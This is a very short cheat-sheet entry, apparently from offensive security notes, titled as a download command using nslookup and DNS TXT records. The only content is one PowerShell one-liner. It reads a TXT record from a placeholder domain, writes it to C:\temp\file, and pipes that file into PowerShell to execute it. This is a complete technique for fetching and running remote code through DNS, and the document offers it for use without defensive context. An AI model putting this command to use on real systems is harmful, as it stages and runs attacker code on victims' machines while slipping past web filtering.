### Download command using nslookup and DNS TXT records
```
$s=echo (nslookup -q=txt &lt;subdomain&gt;.&lt;domain&gt;.&lt;tld&gt;)[-1].Trim();$s.SubString(1,$s.Length-2)&gt;C:\temp\file;type C:\temp\file|powershell
```


